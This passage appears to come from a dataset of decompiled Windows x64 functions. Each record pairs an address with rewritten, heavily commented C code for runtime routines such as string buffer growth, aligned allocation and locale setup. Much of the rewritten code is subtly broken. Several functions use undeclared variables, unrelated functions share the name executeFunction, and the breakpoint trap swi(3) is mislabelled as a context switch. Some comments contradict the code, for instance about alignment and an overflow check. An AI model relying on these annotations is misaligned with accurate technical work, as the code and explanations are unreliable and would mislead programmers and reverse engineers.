= 0; // Null-terminate the data\n\n    // Check if the previous allocation was large and if it needs to be handled\n    if (current_size > 0xf && (0xfff < current_size + 1) && (0x1f < (*memory_block - *(longlong *)(*memory_block + -8)) - 8U)) {\n        FUN_140007f0b: // Label for error handling\n        FUN_14000ed18(); // Handle the error case\n        code *context_switch = (code *)swi(3); // Switch to a different context\n        return (longlong *)(*context_switch)(); // Return from the new context\n    }\n\n    additional_processing(); // Call a thunk function for additional processing\n    *memory_block = (longlong)allocated_memory; // Update param_1 to point to the newly allocated memory\n    return memory_block; // Return the updated param_1\n}\n"}
{"Function Name": "FUN_140007e4a", "Address": "140007e4a", "Source Code": "\nvoid FUN_140007e4a(void)\n{\n    longlong input_value; // Input value from RAX register\n    ulonglong adjusted_value; // Variable to hold adjusted value of in_RAX\n    void *memory_pointer;    // Pointer for memory allocation\n    ulonglong adjusted_size; // Variable for adjusted size calculation\n    longlong *array_pointer; // Pointer to an array or structure (unaffected by the function)\n    undefined8 *allocated_memory_pointer; // Pointer for allocated memory\n    ulonglong unaffected_register_value_1; // Unaffected register value (possibly a pointer)\n    longlong unaffected_register_value_2; // Unaffected register value (possibly a pointer)\n    ulonglong unaffected_register_value_3; // Unaffected register value (used for size checking)\n    undefined8 *unaffected_register_value_4; // Unaffected register value (possibly a pointer)\n\n    adjusted_value = input_value + 1; // Increment in_RAX by 1\n    if (input_value == -1) { // Check if in_RAX is -1\n        adjusted_value = 0xffffffffffffffff; // Set uVar2 to maximum value if in_RAX is -1\n    }\n    if (adjusted_value < 0x1000) { // Check if uVar2 is less than 4096\n        allocated_memory_pointer = (adjusted_value == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(adjusted_value); // Allocate memory if uVar2 is not zero\n    } else {\n        adjusted_size = adjusted_value + 0x27; // Adjust size for alignment\n        if (adjusted_size <= adjusted_value) { // Check for overflow in size calculation\n            adjusted_size = 0xffffffffffffffff; // Set uVar4 to maximum value if overflow occurs\n        }\n        memory_pointer = operator_new(adjusted_size); // Allocate memory with adjusted size\n        if (memory_pointer == (void *)0x0) goto FUN_140007f0b; // Go to error handling if allocation fails\n        allocated_memory_pointer = (undefined8 *)((longlong)memory_pointer + 0x27U & 0xffffffffffffffe0); // Align the pointer to 32-byte boundary\n        allocated_memory_pointer[-1] = memory_pointer; // Store original pointer just before the aligned pointer\n    }\n    array_pointer[2] = unaffected_register_value_1; // Store value from unaff_RSI into the third element of unaff_RBX\n    array_pointer[3] = unaffected_register_value_2; // Store value from unaff_RDI into the fourth element of unaff_RBX\n    FUN_14000c330(allocated_memory_pointer, unaffected_register_value_4, unaffected_register_value_1); // Call another function with allocated memory and other parameters\n    *(undefined1 *)(unaffected_register_value_1 + (longlong)allocated_memory_pointer) = 0; // Set a byte at the calculated address to 0\n    if (0xf < unaffected_register_value_3) { // Check if unaff_R14 is greater than 15\n        if ((0xfff < unaffected_register_value_3 + 1) && (0x1f < (*array_pointer - *(longlong *)(*array_pointer + -8)) - 8U)) { // Check for size constraints\n            FUN_140007f0b: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            ((code *)swi(3))(); // Trigger a software interrupt\n            return; // Exit the function\n        }\n        thunk_FUN_14000b460(); // Call another function (possibly a thunk)\n    }\n    *array_pointer = (longlong)allocated_memory_pointer; // Store the allocated pointer in the first element of unaff_RBX\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_140007f05", "Address": "140007f05", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_140007f05\n{\n    (* (code *)switchFunction(3))(); // Call the function returned by swi(3)\n}\n"}
{"Function Name": "FUN_140007f0b", "Address": "140007f0b", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_140007f0b\n{\n    initializeFunction(); // Call the function FUN_14000ed18\n    ((code *)switchInstruction(3))(); // Call the function pointed to by the result of swi(3)\n}\n"}
{"Function Name": "FUN_140007f20", "Address": "140007f20", "Source Code": "\nundefined8 * FUN_140007f20(undefined8 *source_buffer, undefined8 *destination_buffer, ulonglong requested_size)\n{\n    longlong current_position = source_buffer[2]; // Retrieve the current position from param_1\n\n    // Check if the requested size (param_3) can fit in the available space\n    if (requested_size <= (ulonglong)(source_buffer[3] - current_position)) {\n        source_buffer[2] = current_position + requested_size; // Update the position in param_1 to reflect the new size\n\n        // Determine the appropriate pointer based on the value of param_1[3]\n        undefined8 *target_pointer = (0xf < (ulonglong)source_buffer[3]) ? (undefined8 *)*source_buffer : source_buffer;\n\n        // Call another function to handle the data copying\n        FUN_14000c330((undefined8 *)((longlong)target_pointer + current_position), destination_buffer, requested_size);\n\n        // Null-terminate the data at the new position\n        *(undefined1 *)((longlong)target_pointer + current_position + requested_size) = 0;\n\n        return source_buffer; // Return the updated param_1\n    }\n\n    // If there isn't enough space, call a different function to handle the situation\n    return FUN_1400086d0(source_buffer, requested_size, 0, destination_buffer, requested_size);\n}\n"}
{"Function Name": "FUN_140007f43", "Address": "140007f43", "Source Code": "\nvoid FUN_140007f43(longlong offset, undefined8 *data_pointer, ulonglong threshold)\n{\n    // Initialize unaff_RDI to point to the first element of param_2\n    undefined8 *current_element = (undefined8 *)*data_pointer;\n\n    // Check if param_3 is greater than 15\n    if (0xf < threshold) {\n        // If true, update unaff_RDI to point to the next element in the chain\n        current_element = (undefined8 *)*current_element;\n    }\n\n    // Call FUN_14000c330 with the adjusted pointer and parameters\n    FUN_14000c330((undefined8 *)((longlong)current_element + offset), data_pointer, 0);\n\n    // Set the byte at the calculated address to 0\n    *(undefined1 *)((longlong)current_element + offset) = 0;\n\n    // Return from the function\n    return;\n}\n"}
{"Function Name": "FUN_140007f82", "Address": "140007f82", "Source Code": "\nvoid FUN_140007f82(undefined8 input1, undefined8 input2)\n{\n    // Call the function FUN_1400086d0 with the following parameters:\n    // - unaff_RDI: an undefined register value\n    // - unaff_RSI: another undefined register value\n    // - 0: a constant integer value\n    // - param_2: the second parameter passed to this function\n    // - unaff_RSI: the same undefined register value as before\n    FUN_1400086d0(register1, register2, 0, input2, register2);\n    \n    // Return from the function (no return value)\n    return;\n}\n"}
{"Function Name": "FUN_140007fb0", "Address": "140007fb0", "Source Code": "\nlonglong check_and_return_value(longlong input_pointer)\n{\n    // Check if the pointer at offset 0x40 from param_1 is not null\n    if (*(longlong **)(input_pointer + 0x40) != 0) {\n        // Dereference the pointer at offset 0x58 from param_1 and return the value as longlong\n        return (long_integer)**(int **)(input_pointer + 0x58);\n    }\n    // Return 0 if the pointer at offset 0x40 is null\n    return 0;\n}\n"}
{"Function Name": "FUN_140007fd0", "Address": "140007fd0", "Source Code": "\nlonglong check_and_return_value(longlong input_address)\n{\n    // Check if the value at the address (param_1 + 0x38) dereferenced twice is not zero\n    if (**(longlong **)(input_address + 0x38) != 0) {\n        // If not zero, return the value at the address (param_1 + 0x50) dereferenced as an int\n        return (long_integer)**(int **)(input_address + 0x50);\n    }\n    // If the condition is not met, return zero\n    return 0;\n}\n"}
{"Function Name": "FUN_140007ff0", "Address": "140007ff0", "Source Code": "\nvoid FUN_140007ff0(longlong input_param, undefined8 locale_param)\n{\n    longlong *longlong_pointer; // Pointer to a longlong variable\n    code *code_pointer; // Pointer to a code variable\n    ulonglong counter_value; // Variable to store an unsigned long long value\n    _Facet_base *facet_base_pointer; // Pointer to a _Facet_base structure\n    undefined1 undefined_value; // Variable to store an undefined type\n    undefined8 *undefined_pointer; // Pointer to an undefined8 variable\n    _Locimp *locimp_pointer; // Pointer to a _Locimp structure\n    longlong longlong_value; // Variable to store a longlong value\n    _Facet_base *facet_base_pointer_2; // Pointer to a _Facet_base structure\n    undefined1 undefined_array[32]; // Array to store undefined types\n    undefined8 local_variable_1 = 0xfffffffffffffffe; // Local variable initialized to a specific value\n    ulonglong local_variable_2 = DAT_140038080 ^ (ulonglong)undefined_array; // Local variable for security check\n\n    // Initialize fields in the structure pointed to by param_1\n    *(undefined8 *)(input_param + 0x40) = 0; // Set field at offset 0x40 to 0\n    *(undefined8 *)(input_param + 8) = 0; // Set field at offset 8 to 0\n    *(undefined4 *)(input_param + 0x14) = 0; // Set field at offset 0x14 to 0\n    *(undefined4 *)(input_param + 0x18) = 0x201; // Set field at offset 0x18 to 0x201\n    *(undefined8 *)(input_param + 0x20) = 6; // Set field at offset 0x20 to 6\n    *(undefined8 *)(input_param + 0x28) = 0; // Set field at offset 0x28 to 0\n    *(undefined8 *)(input_param + 0x30) = 0; // Set field at offset 0x30 to 0\n    *(undefined8 *)(input_param + 0x38) = 0; // Set field at offset 0x38 to 0\n    *(undefined4 *)(input_param + 0x10) = 0; // Set field at offset 0x10 to 0\n\n    // Allocate memory for an undefined8 array\n    undefined_pointer = (undefined8 *)operator_new(0x10);\n    undefined_pointer[1] = (undefined8)std::locale::_Init(true); // Initialize locale\n    *(undefined8 **)(input_param + 0x40) = undefined_pointer; // Store pointer in the structure\n    *(undefined8 *)(input_param + 0x48) = locale_param; // Store param_2 in the structure\n\n    longlong_pointer = (longlong *)undefined_pointer[1]; // Get the pointer from the locale\n    (**(code **)(*longlong_pointer + 8))(longlong_pointer); // Call a function using the pointer\n    std::_Lockit::_Lockit(local_34, 0); // Lock a resource\n    facet_base_pointer = DAT_14003ad20; // Get a pointer to a _Facet_base structure\n\n    // Check if a certain condition is met\n    if (DAT_140039288 == 0) {\n        std::_Lockit::_Lockit(local_38, 0); // Lock another resource\n        if (DAT_140039288 == 0) {\n            DAT_140039270++; // Increment a counter\n            DAT_140039288 = (ulonglong)DAT_140039270; // Update a variable\n        }\n        std::_Lockit::~_Lockit(local_38); // Unlock the resource\n    }\n\n    counter_value = DAT_140039288; // Store the value of DAT_140039288\n    // Check if the current index is within bounds and if the pointer is not null\n    if ((DAT_140039288 < (ulonglong)longlong_pointer[3]) &&\n        (facet_base_pointer_2 = *(_Facet_base **)(longlong_pointer[2] + DAT_140039288 * 8), facet_base_pointer_2 != (_Facet_base *)0x0))\n        goto LAB_14000815e; // Jump to label if conditions are met\n\n    // Check if a certain character is null\n    if (*(char *)((longlong)longlong_pointer + 0x24) == '\\0') {\n        if (facet_base_pointer_2 != (_Facet_base *)0x0) goto LAB_14000815e; // Jump if pointer is not null\n    } else {\n        longlong_value = FUN_1400098b4(); // Call a function and store the result\n        // Check if the current index is within bounds\n        if (counter_value < *(ulonglong *)(longlong_value + 0x18)) {\n            facet_base_pointer_2 = *(_Facet_base **)(*(longlong *)(longlong_value + 0x10) + counter_value * 8); // Get pointer based on index\n            goto LAB_140008114; // Jump to label\n        }\n    }\n\n    facet_base_pointer_2 = facet_base_pointer; // Assign p_Var4 to p_Var9\n    // Check if p_Var4 is null\n    if (facet_base_pointer == (_Facet_base *)0x0) {\n        longlong_value = FUN_1400020e0((longlong *)&facet_base_pointer, (longlong)local_60); // Call a function to initialize p_Var4\n        facet_base_pointer_2 = facet_base_pointer; // Assign p_Var4 to p_Var9\n        // Check if the function call failed\n        if (longlong_value == -1) {\n            FUN_140002030(local_50); // Call a function to handle error\n            FUN_14000c234(local_50, &DAT_1400361f0); // Call another function with parameters\n            code_pointer = (code *)swi(3); // Get a pointer to a system call\n            (*code_pointer)(); // Call the system function\n            return; // Exit the function\n        }\n        std::_Facet_Register(facet_base_pointer); // Register the facet\n        (**(code **)(*(longlong *)facet_base_pointer_2 + 8))(facet_base_pointer_2); // Call a function on p_Var9\n        DAT_14003ad20 = facet_base_pointer_2; // Update global variable\n    }\n\nLAB_14000815e: // Label for jumping\n    std::_Lockit::~_Lockit(local_34); // Unlock the resource\n    undefined_value = (**(code **)(*(longlong *)facet_base_pointer_2 + 0x40))(facet_base_pointer_2, 0x20); // Call a function and store the result\n    undefined_pointer = (undefined8 *)(**(code **)(*longlong_pointer + 0x10))(longlong_pointer); // Get another pointer\n    // Check if the pointer is not null\n    if (undefined_pointer != (undefined8 *)0x0) {\n        (**(code **)*undefined_pointer)(undefined_pointer, 1); // Call a function using the pointer\n    }\n    *(undefined1 *)(input_param + 0x58) = undefined_value; // Store the result in the structure\n    // Check if a certain field is null\n    if (*(longlong *)(input_param + 0x48) == 0) {\n        FUN_1400024f0(input_param, *(uint *)(input_param + 0x10) | 4, '\\0'); // Call a function with parameters\n    }\n    __security_check_cookie(local_variable_2 ^ (ulonglong)undefined_array); // Security check\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_1400081f0", "Address": "1400081f0", "Source Code": "\nlonglong * FUN_1400081f0(longlong *output_array, undefined8 *input_array, longlong input_string)\n{\n    ulonglong total_size; // Variable to hold the calculated size\n    longlong char_count; // Variable for loop index and size calculations\n    ulonglong string_length = 0xffffffffffffffff; // Variable to count characters in a string\n    output_array[2] = 0; // Initialize the size of param_1\n    output_array[3] = 7; // Set a default value for param_1[3]\n    *(undefined2 *)output_array = 0; // Initialize the first two bytes of param_1 to zero\n\n    char_count = -1; // Start lVar4 at -1 for counting characters\n    do {\n        char_count++; // Increment lVar4\n    } while (*(short *)(input_string + char_count * 2) != 0); // Continue until null terminator is found\n\n    total_size = char_count + input_array[2]; // Calculate total size needed\n    char_count = output_array[2]; // Store current size of param_1\n\n    if (total_size != 7) { // Check if the calculated size is not equal to 7\n        if ((ulonglong)output_array[3] < total_size) { // If current size is less than needed size\n            FUN_140008ef0(output_array, total_size - char_count); // Resize param_1\n            output_array[2] = char_count; // Update the size of param_1\n        } else if ((total_size < 8) && (7 < (ulonglong)output_array[3])) { // Check if size is within a certain range\n            undefined8 *data_pointer = (undefined8 *)*output_array; // Get pointer to the data in param_1\n            FUN_14000c330(output_array, data_pointer, char_count * 2 + 2); // Perform some operation on param_1\n            if ((0xfff < output_array[3] * 2 + 2U) && (0x1f < (ulonglong)((longlong)data_pointer + (-8 - data_pointer[-1])))) { // Check for memory limits\n                FUN_14000ed18(); // Call a function to handle memory issues\n                code *context_switch = (code *)swi(3); // Switch to a different context\n                return (longlong *)(*context_switch)(); // Return from the new context\n            }\n            thunk_FUN_14000b460(); // Call a thunk function\n            output_array[3] = 7; // Reset param_1[3] to 7\n        }\n    }\n\n    if (7 < (ulonglong)input_array[3]) { // If param_2[3] exceeds 7\n        input_array = (undefined8 *)*input_array; // Dereference param_2\n    }\n    FUN_140008ae0(output_array, input_array, input_array[2]); // Call function with param_1 and param_2\n\n    do {\n        string_length++; // Increment uVar7\n    } while (*(short *)(input_string + string_length * 2) != 0); // Continue until null terminator is found\n\n    FUN_140008ae0(output_array, input_string, string_length); // Call function with param_1 and param_3\n    return output_array; // Return the modified param_1\n}\n"}
{"Function Name": "FUN_140008330", "Address": "140008330", "Source Code": "\nlonglong * FUN_140008330(longlong *inputPointer) // Function definition with a pointer to longlong as parameter\n{\n    byte byteValue; // Variable to hold a byte value\n    int intValue; // Variable to hold an integer value\n    byte *bytePointer; // Pointer to a byte\n    longlong *longPointer; // Pointer to longlong\n    uint unsignedIntValue; // Variable to hold an unsigned integer\n    uint statusFlag = 0; // Initialize uVar7 to 0\n    longlong longValue1; // Variable to hold a longlong value\n    longlong longValue2; // Variable to hold a longlong value\n    longlong *localPointer; // Local pointer to longlong\n\n    // Calculate lVar9 based on the value at a specific memory location\n    longValue2 = *(longlong *)((longlong)*(int *)(*inputPointer + 4) + 0x28 + (longlong)inputPointer);\n    longValue2 = (longValue2 < 2) ? 0 : (longValue2 - 1); // Adjust lVar9 based on its value\n    \n    FUN_1400088f0(&localPointer, inputPointer); // Call another function with local_28 and param_1\n    \n    // Check a specific condition in memory\n    if (*(char *)((longlong)*(int *)(*inputPointer + 4) + 0x58 + (longlong)inputPointer) == '\\0') {\n        statusFlag = 4; // Set uVar7 to 4 if condition is met\n    } else {\n        longValue1 = *inputPointer; // Get the value pointed by param_1\n        // Check a specific condition in memory\n        if ((*(uint *)((longlong)*(int *)(longValue1 + 4) + 0x18 + (longlong)inputPointer) & 0x1c0) != 0x40) {\n            // Loop while lVar9 is greater than 0\n            for (; longValue2 > 0; longValue2--) {\n                longPointer = *(longlong **)((longlong)*(int *)(*inputPointer + 4) + 0x48 + (longlong)inputPointer); // Get pointer from memory\n                byteValue = *(byte *)((longlong)*(int *)(*inputPointer + 4) + 0x58 + (longlong)inputPointer); // Get byte value from memory\n                // Check if a specific pointer is null\n                if (*(longlong *)longPointer[8] == 0) {\n                    unsignedIntValue = (**(code **)(*longPointer + 0x18))(longPointer, byteValue); // Call a function through a function pointer\n                } else {\n                    intValue = *(int *)longPointer[0xb]; // Get an integer value from memory\n                    if (intValue < 1) break; // Break if the integer is less than 1\n                    *(int *)longPointer[0xb] = intValue - 1; // Decrement the integer value\n                    bytePointer = *(byte **)longPointer[8]; // Get pointer to byte\n                    *(byte **)longPointer[8] = bytePointer + 1; // Increment the byte pointer\n                    *bytePointer = byteValue; // Assign the byte value\n                    unsignedIntValue = (uint)byteValue; // Set uVar6 to the byte value\n                }\n                if (unsignedIntValue == 0xffffffff) goto LAB_14000848b; // Check for error condition\n            }\n        }\n        longPointer = *(longlong **)((longlong)*(int *)(longValue1 + 4) + 0x48 + (longlong)inputPointer); // Get pointer from memory\n        longValue1 = (**(code **)(*longPointer + 0x48))(longPointer, &DAT_140031778); // Call a function through a function pointer\n        if (longValue1 == 1) { // Check if the return value is 1\n            // Loop while lVar9 is greater than 0\n            for (; longValue2 > 0; longValue2--) {\n                longPointer = *(longlong **)((longlong)*(int *)(*inputPointer + 4) + 0x48 + (longlong)inputPointer); // Get pointer from memory\n                byteValue = *(byte *)((longlong)*(int *)(*inputPointer + 4) + 0x58 + (longlong)inputPointer); // Get byte value from memory\n                // Check if a specific pointer is null\n                if (*(longlong *)longPointer[8] == 0) {\n                    unsignedIntValue = (**(code **)(*longPointer + 0x18))(longPointer, byteValue, longPointer, byteValue, 0); // Call a function through a function pointer\n                } else {\n                    intValue = *(int *)longPointer[0xb]; // Get an integer value from memory\n                    if (intValue < 1) break; // Break if the integer is less than 1\n                    *(int *)longPointer[0xb] = intValue - 1; // Decrement the integer value\n                    bytePointer = *(byte **)longPointer[8]; // Get pointer to byte\n                    *(byte **)longPointer[8] = bytePointer + 1; // Increment the byte pointer\n                    *bytePointer = byteValue; // Assign the byte value\n                    unsignedIntValue = (uint)byteValue; // Set uVar6 to the byte value\n                }\n                if (unsignedIntValue == 0xffffffff) goto LAB_14000848b; // Check for error condition\n            }\n        } else {\n        LAB_14000848b: // Error handling label\n            statusFlag = 4; // Set uVar7 to 4 on error\n        }\n    }\n    \n    *(undefined8 *)((longlong)*(int *)(*inputPointer + 4) + 0x28 + (longlong)inputPointer) = 0; // Set a specific memory location to 0\n    unsignedIntValue = *(uint *)((longlong)*(int *)(*inputPointer + 4) + (longlong)inputPointer + 0x10) | statusFlag | 4; // Combine values for uVar6\n    // Check if a specific pointer is not null\n    if (*(longlong *)((longlong)*(int *)(*inputPointer + 4) + (longlong)inputPointer + 0x48) != 0) {\n        unsignedIntValue = statusFlag; // Set uVar6 to uVar7 if the pointer is not null\n    }\n    FUN_1400024f0((longlong)*(int *)(*inputPointer + 4) + (longlong)inputPointer, unsignedIntValue, '\\0'); // Call another function with parameters\n    \n    if (!__uncaught_exception()) { // Check for uncaught exceptions\n        FUN_140008a80(localPointer); // Call a function with local_28\n    }\n    \n    longPointer = *(longlong **)((longlong)*(int *)(*localPointer + 4) + 0x48 + (longlong)localPointer); // Get pointer from local_28\n    if (longPointer != (longlong *)0x0) { // Check if the pointer is not null\n        (**(code **)(*longPointer + 0x10))(); // Call a function through a function pointer\n    }\n    \n    return inputPointer; // Return the original parameter\n}\n"}
{"Function Name": "FUN_140008520", "Address": "140008520", "Source Code": "\nlonglong *\nFUN_140008520(longlong *allocation_array, ulonglong requested_size, undefined8 context_data, longlong additional_param, undefined2 short_param)\n{\n    longlong current_size = allocation_array[2]; // Retrieve the current size from the second element of param_1\n    if (0x7ffffffffffffffeU - current_size < requested_size) { // Check if the requested size exceeds the maximum allowed\n        FUN_140008a30(); // Call a function to handle the error\n        code *context_switch_function = (code *)swi(3); // Switch to a different context\n        return (longlong *)(*context_switch_function)(); // Return from the new context\n    }\n    \n    ulonglong current_allocation_size = allocation_array[3]; // Get the current allocation size from the third element of param_1\n    ulonglong aligned_new_size = (requested_size + current_size | 7); // Calculate the new size aligned to 8 bytes\n    ulonglong max_allowed_size = 0x7ffffffffffffffe; // Initialize uVar11 to the maximum allowed size\n    \n    // Check if the new size is within limits and adjust uVar11 if necessary\n    if (((aligned_new_size < 0x7fffffffffffffff) && (current_allocation_size <= 0x7ffffffffffffffe - (current_allocation_size >> 1))) &&\n        (ulonglong adjusted_allocation_size = (current_allocation_size >> 1) + current_allocation_size, max_allowed_size = aligned_new_size, aligned_new_size < adjusted_allocation_size)) {\n        max_allowed_size = adjusted_allocation_size; // Update uVar11 to the smaller of the two sizes\n    }\n    \n    undefined8 *new_memory_pointer = (undefined8 *)0x0; // Initialize pointer for new memory allocation\n    aligned_new_size = (max_allowed_size + 1) * 2; // Calculate the size needed for allocation\n    \n    // Check if the allocation size is manageable\n    if ((max_allowed_size + 1 < 0x8000000000000000) && (aligned_new_size < 0x1000)) {\n        if (aligned_new_size != 0) {\n            new_memory_pointer = (undefined8 *)operator_new(aligned_new_size); // Allocate memory if size is non-zero\n        }\n    } else {\n        aligned_new_size = aligned_new_size + 0x27; // Adjust size for alignment\n        if (aligned_new_size <= aligned_new_size) { // Check for overflow\n            aligned_new_size = 0xffffffffffffffff; // Set to maximum if overflow occurs\n        }\n        void *allocated_memory = operator_new(aligned_new_size); // Attempt to allocate memory\n        if (allocated_memory == (void *)0x0) goto FUN_1400086bb; // Handle allocation failure\n        new_memory_pointer = (undefined8 *)((longlong)allocated_memory + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        new_memory_pointer[-1] = allocated_memory; // Store the original pointer for deallocation\n    }\n    \n    allocation_array[3] = max_allowed_size; // Update the size in param_1\n    allocation_array[2] = requested_size + current_size; // Update the total allocated size in param_1\n    undefined2 *new_data_pointer = (undefined2 *)((current_size * 2) + (longlong)new_memory_pointer); // Calculate the pointer for the new data\n    \n    // Call a function to initialize the new memory if the current size is small\n    if (current_allocation_size < 8) {\n        FUN_14000c330(new_memory_pointer, allocation_array, current_size * 2);\n    } else {\n        FUN_14000c330(new_memory_pointer, (undefined8 *)*allocation_array, current_size * 2); // Initialize memory for larger sizes\n        // Check if the allocation is too large and handle accordingly\n        if ((0xfff < current_allocation_size * 2 + 2) && (0x1f < (ulonglong)((longlong)new_memory_pointer + (-8 - new_memory_pointer[-1])))) {\n            FUN_1400086bb: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            code *context_switch_function = (code *)swi(3); // Switch to a different context\n            return (longlong *)(*context_switch_function)(); // Return from the new context\n        }\n        thunk_FUN_14000b460(); // Call another function for additional processing\n    }\n    \n    *allocation_array = (longlong)new_memory_pointer; // Store the new pointer in param_1\n    return allocation_array; // Return the updated param_1\n}\n"}
{"Function Name": "FUN_14000854f", "Address": "14000854f", "Source Code": "\nvoid FUN_14000854f(longlong param_1,longlong param_2)\n{\n    ulonglong valueFromMemory; // Variable to hold a value from the memory at param_1 + 0x18\n    undefined8 *memoryPointer; // Pointer for dynamic memory allocation\n    ulonglong calculationResult; // Variable for calculations and conditions\n    longlong loopCounter; // Loop counter variable\n    undefined2 *memoryAccessPointer; // Pointer for accessing memory for undefined2 type\n    undefined2 stackVariable; // Variable for stack usage\n\n    valueFromMemory = *(ulonglong *)(param_1 + 0x18); // Retrieve value from memory\n    calculationResult = (param_2 + inputParameter | 7); // Calculate uVar5 with bitwise OR operation\n    \n    // Check if uVar5 and uVar1 are within certain limits\n    if ((calculationResult <= limitValue) && (valueFromMemory <= limitValue - (valueFromMemory >> 1))) {\n        ulonglong calculatedValue = (valueFromMemory >> 1) + valueFromMemory; // Calculate uVar7 based on uVar1\n        if (calculationResult < calculatedValue) { // Check if uVar5 is less than uVar7\n            limitValue = calculatedValue; // Update unaff_RDI if condition is met\n        }\n    }\n    \n    memoryPointer = (undefined8 *)0x0; // Initialize pointer to null\n    calculationResult = (limitValue + 1) * 2; // Calculate size for memory allocation\n\n    // Check if the calculated size is within valid limits\n    if ((limitValue + 1 < 0x8000000000000000) && (calculationResult < 0x1000)) {\n        if (calculationResult != 0) { // Ensure size is not zero\n            memoryPointer = (undefined8 *)operator_new(calculationResult); // Allocate memory\n        }\n    } else {\n        calculationResult = 0xffffffffffffffff; // Set uVar5 to maximum value\n        void *allocatedMemoryPointer = operator_new(calculationResult); // Attempt to allocate maximum memory\n        if (allocatedMemoryPointer == (void *)0x0) goto FUN_1400086bb; // Check for allocation failure\n        memoryPointer = (undefined8 *)((longlong)allocatedMemoryPointer + 0x27U & 0xffffffffffffffe0); // Align pointer\n        memoryPointer[-1] = allocatedMemoryPointer; // Store original pointer before alignment\n    }\n\n    dynamicArray[3] = limitValue; // Store unaff_RDI in the fourth element of unaff_R14\n    calculationResult = inputParameter * 2; // Calculate size based on unaff_R12\n    dynamicArray[2] = param_2 + inputParameter; // Store adjusted param_2 in unaff_R14\n    memoryAccessPointer = (undefined2 *)(calculationResult + (longlong)memoryPointer); // Set puVar9 to point to the calculated memory\n\n    // Call function based on the value of uVar1\n    if (valueFromMemory < 8) {\n        FUN_14000c330(memoryPointer, dynamicArray, calculationResult); // Call function with puVar8 and unaff_R14\n    } else {\n        FUN_14000c330(memoryPointer, (undefined8 *)*dynamicArray, calculationResult); // Call function with dereferenced unaff_R14\n    }\n\n    loopCounter = loopLimit; // Initialize loop counter with unaff_R15\n    if (loopCounter != 0) { // Check if loop counter is non-zero\n        for (; loopCounter != 0; loopCounter--) { // Loop until counter reaches zero\n            *memoryAccessPointer = stackVariable; // Assign value from stack to memory pointed by puVar9\n            memoryAccessPointer++; // Move to the next memory location\n        }\n    }\n    \n    *(undefined2 *)((longlong)memoryPointer + (loopLimit + inputParameter) * 2) = 0; // Set a specific memory location to zero\n\n    // Check conditions for potential error handling\n    if ((0xfff < valueFromMemory * 2 + 2) && (0x1f < (ulonglong)((longlong)memoryPointer + (-8 - memoryPointer[-1])))) {\n        FUN_1400086bb: // Label for error handling\n        FUN_14000ed18(); // Call error handling function\n        code *functionPointer = (code *)swi(3); // Retrieve a function pointer\n        (*functionPointer)(); // Call the function pointed to by pcVar3\n        return; // Exit the function\n    }\n    \n    thunk_FUN_14000b460(); // Call another function\n    *dynamicArray = memoryPointer; // Store the allocated memory pointer in unaff_R14\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_1400086bb", "Address": "1400086bb", "Source Code": "\nvoid executeFunction(void)\n{\n    // Call a function pointed to by the result of swi(3)\n    // The swi(3) function is expected to return a pointer to a function (code)\n    (*((code *)switchInstruction(3)))();\n}\n"}
{"Function Name": "FUN_1400086c1", "Address": "1400086c1", "Source Code": "\nvoid executeFunction(void) // Function definition for FUN_1400086c1\n{\n    (*((code *)switchFunction(3)))(); // Call the function pointed to by the result of swi(3)\n}\n"}
{"Function Name": "FUN_1400086d0", "Address": "1400086d0", "Source Code": "\nlonglong *\nFUN_1400086d0(longlong *memory_structure, ulonglong requested_size, undefined8 unknown_param_1, undefined8 *source_data, longlong data_size)\n{\n    undefined8 *allocated_memory_pointer; // Pointer to hold the allocated memory\n    ulonglong current_allocated_size = memory_structure[2]; // Current size of allocated memory\n    ulonglong max_allocated_size = memory_structure[3]; // Maximum size of allocated memory\n    ulonglong new_size, adjusted_size, final_size; // Variables for size calculations\n    \n    // Check if the requested size exceeds the maximum allowable size\n    if (0x7fffffffffffffff - current_allocated_size < requested_size) {\n        FUN_140008a30(); // Call error handling function\n        code *system_call_pointer = (code *)swi(3); // Switch to system call\n        return (longlong *)(*system_call_pointer)(); // Return from system call\n    }\n    \n    // Calculate the new size aligned to 16 bytes\n    new_size = (requested_size + current_allocated_size | 0xf);\n    final_size = 0x7fffffffffffffff; // Initialize uVar11 to maximum value\n    \n    // Check if the new size is within limits and adjust if necessary\n    if (((new_size < 0x8000000000000000) && (max_allocated_size <= 0x7fffffffffffffff - (max_allocated_size >> 1))) &&\n        (adjusted_size = (max_allocated_size >> 1) + max_allocated_size, final_size = new_size, new_size < adjusted_size)) {\n        final_size = adjusted_size; // Update uVar11 if new size is smaller\n    }\n    \n    new_size = final_size + 1; // Increment the new size\n    if (final_size == 0xffffffffffffffff) {\n        new_size = 0xffffffffffffffff; // Handle overflow case\n    }\n    \n    undefined8 *new_memory_pointer; // Pointer for new memory allocation\n    // Allocate memory based on the calculated size\n    if (new_size < 0x1000) {\n        new_memory_pointer = (new_size == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(new_size);\n    } else {\n        adjusted_size = new_size + 0x27; // Adjust size for alignment\n        if (adjusted_size <= new_size) {\n            adjusted_size = 0xffffffffffffffff; // Handle overflow case\n        }\n        void *allocated_memory = operator_new(adjusted_size); // Allocate memory\n        if (allocated_memory == (void *)0x0) { // Check if allocation failed\n            FUN_140008847: // Label for error handling\n            FUN_14000ed18(); // Call error handling function\n            code *system_call_pointer = (code *)swi(3); // Switch to system call\n            return (longlong *)(*system_call_pointer)(); // Return from system call\n        }\n        // Align the pointer to 16 bytes\n        new_memory_pointer = (undefined8 *)((longlong)allocated_memory + 0x27U & 0xffffffffffffffe0);\n        new_memory_pointer[-1] = allocated_memory; // Store original pointer for deallocation\n    }\n    \n    // Update the size in the parameter structure\n    memory_structure[2] = requested_size + current_allocated_size; // Update current size\n    allocated_memory_pointer = (undefined8 *)((longlong)new_memory_pointer + current_allocated_size); // Pointer to the new memory location\n    memory_structure[3] = final_size; // Update maximum size\n    \n    // Conditional logic for handling small and large allocations\n    if (max_allocated_size < 0x10) {\n        FUN_14000c330(new_memory_pointer, memory_structure, current_allocated_size); // Copy data for small allocations\n        FUN_14000c330(allocated_memory_pointer, source_data, data_size); // Copy data from param_4\n        *(undefined1 *)((longlong)allocated_memory_pointer + data_size) = 0; // 